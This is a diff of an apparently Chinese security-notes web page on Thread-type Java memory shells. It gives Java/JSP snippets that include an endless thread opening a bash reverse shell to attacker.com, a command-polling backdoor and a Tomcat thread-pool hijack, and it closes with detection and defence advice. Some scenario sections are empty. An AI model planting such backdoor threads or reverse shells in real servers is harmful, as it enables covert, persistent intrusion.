@@ -86,7 +86,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#springcontroller" class="md-skip">
+        <a href="#thread" class="md-skip">
           Skip to content
         </a>
       
@@ -2772,10 +2772,21 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#thread_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Thread 型内存马是什么
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
     <span class="md-ellipsis">
       
-        
+        核心原理
       
     </span>
   </a>
@@ -2783,24 +2794,41 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#thread_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Thread 型内存马的两种形态
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Thread 型内存马的两种形态">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       
-        
+        形态一：独立线程（“幽灵线程”）
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
+        
+          <li class="md-nav__item">
   <a href="#_3" class="md-nav__link">
     <span class="md-ellipsis">
       
-        
+        形态二：劫持已有线程（“线程寄生”）
       
     </span>
   </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -2808,7 +2836,57 @@
   <a href="#_4" class="md-nav__link">
     <span class="md-ellipsis">
       
+        典型场景
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="典型场景">
+      <ul class="md-nav__list">
         
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        定时任务
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        反弹shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        内存中的命令队列
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jsp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        完整注入器（JSP）
       
     </span>
   </a>
@@ -2816,10 +2894,88 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
+  <a href="#_7" class="md-nav__link">
     <span class="md-ellipsis">
       
+        优势与局限
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="优势与局限">
+      <ul class="md-nav__list">
         
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        优势
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        局限性
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        检测与防御
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="检测与防御">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        检测方法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        防御建议
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        总结
       
     </span>
   </a>
@@ -2846,12 +3002,158 @@
   
 
 
-<h1 id="springcontroller">SpringController型内存马<a class="headerlink" href="#springcontroller" title="Permanent link">&para;</a></h1>
-<h2 id="_1"><a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<h2 id="_2"><a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<h2 id="_3"><a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
-<h2 id="_4"><a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
-<h2 id="_5"><a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<h1 id="thread">Thread 型内存马<a class="headerlink" href="#thread" title="Permanent link">&para;</a></h1>
+<h2 id="thread_1">Thread 型内存马是什么<a class="headerlink" href="#thread_1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Thread 型内存马的核心思想是：在目标 JVM 中启动一个后台线程，该线程持续运行，执行恶意操作（如命令执行、反弹 Shell、数据窃取），而不依赖任何 Web 组件（Filter/Listener/Servlet）。</p>
+</blockquote>
+<p>它的核心概念很简单：在内存中跑一个看不见的“幽灵线程”，这个线程会持续干坏事。</p>
+<h2 id="_1">核心原理<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>在 Java 中，线程是 JVM 调度执行的基本单位。一个 Web 应用通常有大量的线程池（如 Tomcat 的请求处理线程池）。攻击者可以利用代码执行漏洞，创建并启动一个新的后台线程，这个线程会持续运行，执行恶意代码。</p>
+</blockquote>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1">// 核心代码：启动一个后台线程</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">new</span><span class="w"> </span><span class="n">Thread</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Runnable</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nd">@Override</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">                </span><span class="c1">// 恶意操作：执行系统命令、反弹Shell、数据窃取</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">                </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1&#39;&quot;</span><span class="p">);</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">                </span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mi">60000</span><span class="p">);</span><span class="w"> </span><span class="c1">// 每分钟执行一次</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">                </span><span class="c1">// 静默处理</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">            </span><span class="p">}</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="p">}).</span><span class="na">start</span><span class="p">();</span>
+</span></code></pre></div>
+<h2 id="thread_2">Thread 型内存马的两种形态<a class="headerlink" href="#thread_2" title="Permanent link">&para;</a></h2>
+<h3 id="_2">形态一：独立线程（“幽灵线程”）<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>特点：不依赖任何 Web 组件，完全独立运行</p>
+</blockquote>
+<div class="language-jsp highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">&lt;%</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1">// 启动一个独立的后台线程</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="k">new</span><span class="w"> </span><span class="n">Thread</span><span class="p">(()</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">            </span><span class="c1">// 每 10 秒检查一次是否有待执行的命令</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getCommandFromSomewhere</span><span class="p">();</span><span class="w"> </span><span class="c1">// 从文件/数据库/网络获取命令</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">                </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">            </span><span class="p">}</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">            </span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">            </span><span class="c1">// 静默</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="p">}).</span><span class="na">start</span><span class="p">();</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="k">%&gt;</span>
+</span></code></pre></div>
+<h3 id="_3">形态二：劫持已有线程（“线程寄生”）<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>特点：不创建新线程，而是劫持 Tomcat 已有的线程池，在现有线程中插入恶意逻辑。</p>
+<p>这种形态更加隐蔽，因为它不会增加新的线程（jstack 看不到额外的线程），更难被检测。</p>
+</blockquote>
+<div class="language-jsp highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>//<span class="w"> </span>通过反射劫持<span class="w"> </span>Tomcat<span class="w"> </span>的线程池
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>//<span class="w"> </span>伪代码：在<span class="w"> </span>Tomcat<span class="w"> </span>的线程执行任务之前插入恶意代码
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>ThreadPoolExecutor<span class="w"> </span>executor<span class="w"> </span>=<span class="w"> </span>getTomcatThreadPool();
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>executor.setThreadFactory(new<span class="w"> </span>ThreadFactory()<span class="w"> </span>{
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">    </span>@Override
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span>public<span class="w"> </span>Thread<span class="w"> </span>newThread(Runnable<span class="w"> </span>r)<span class="w"> </span>{
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">        </span>//<span class="w"> </span>包装原始的<span class="w"> </span>Runnable
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">        </span>Runnable<span class="w"> </span>wrapped<span class="w"> </span>=<span class="w"> </span>()<span class="w"> </span>-&gt;<span class="w"> </span>{
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">            </span>try<span class="w"> </span>{
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">                </span>//<span class="w"> </span>执行恶意代码
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">                </span>checkAndExecuteCommand();
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="w">            </span>}<span class="w"> </span>catch<span class="w"> </span>(Exception<span class="w"> </span>e)<span class="w"> </span>{
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="w">                </span>//<span class="w"> </span>静默
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="w">            </span>}
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="w">            </span>//<span class="w"> </span>执行原始任务
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="w">            </span>r.run();
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="w">        </span>};
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="w">        </span>return<span class="w"> </span>new<span class="w"> </span>Thread(wrapped);
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="w">    </span>}
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>});
+</span></code></pre></div>
+<h2 id="_4">典型场景<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h3 id="_5">定时任务<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="language-jsp highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>
+</span></code></pre></div>
+<h3 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h3>
+<div class="language-jsp highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>
+</span></code></pre></div>
+<h3 id="_6">内存中的命令队列<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<div class="language-jsp highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>
+</span></code></pre></div>
+<h2 id="jsp">完整注入器（JSP）<a class="headerlink" href="#jsp" title="Permanent link">&para;</a></h2>
+<h2 id="_7">优势与局限<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<h3 id="_8">优势<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>完全独立  不依赖任何 Web 组件，即使 Filter/Controller 被清理，线程依然运行</p>
+</li>
+<li>
+<p>无 URL 暴露  不需要访问任何路径触发，无法被流量审计发现</p>
+</li>
+<li>
+<p>适合持久化后门   可以持续执行定时任务、反弹 Shell、数据窃取</p>
+</li>
+<li>
+<p>多线程能力 可以同时执行多个恶意任务</p>
+</li>
+</ul>
+<h3 id="_9">局限性<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>重启即失效 应用重启后线程消失</p>
+</li>
+<li>
+<p>回显困难  不像 Filter/Servlet 那样可以直接通过 response 回显</p>
+</li>
+<li>
+<p>需要独立通道    命令和结果需要通过其他方式传递（如共享变量、文件、网络）</p>
+</li>
+<li>
+<p>可能被线程池管理  如果应用有线程池监控，可能被观察到</p>
+</li>
+</ul>
+<h2 id="_10">检测与防御<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h2>
+<h3 id="_11">检测方法<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>jstack 分析 查看 JVM 中所有线程，发现可疑的线程名称或堆栈</p>
+</li>
+<li>
+<p>线程数量监控    异常增加的线程数可能意味着被植入后门</p>
+</li>
+<li>
+<p>JMX 监控    通过 JMX 查看线程池状态</p>
+</li>
+<li>
+<p>RASP 监控   监控 Thread.start() 的调用</p>
+</li>
+</ul>
+<h3 id="_12">防御建议<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>限制代码执行入口：防止 JSP 上传、反序列化等漏洞</p>
+</li>
+<li>
+<p>线程监控：定期检查 JVM 线程状态</p>
+</li>
+<li>
+<p>使用 RASP：Hook Thread.start() 和 ScheduledExecutorService.schedule()</p>
+</li>
+<li>
+<p>定期重启：重启应用可以清除线程型内存马</p>
+</li>
+</ul>
+<h2 id="_13">总结<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Thread 型内存马的本质是：利用代码执行入口，在目标 JVM 中创建一个独立的后台线程，该线程不依赖任何 Web 组件，独立运行并执行恶意操作（如定时执行命令、反弹 Shell），实现高隐蔽性的持久化后门。</p>
+</blockquote>
 
 
 
@@ -2874,7 +3176,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 12, 2026 14:53:08 UTC"><span class="timeago" datetime="2026-07-12T14:53:08+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 12, 2026 14:53:08 UTC">2026-07-12</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 20, 2026 16:26:08 UTC"><span class="timeago" datetime="2026-07-20T16:26:08+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 20, 2026 16:26:08 UTC">2026-07-20</span>
   </span>
 
     
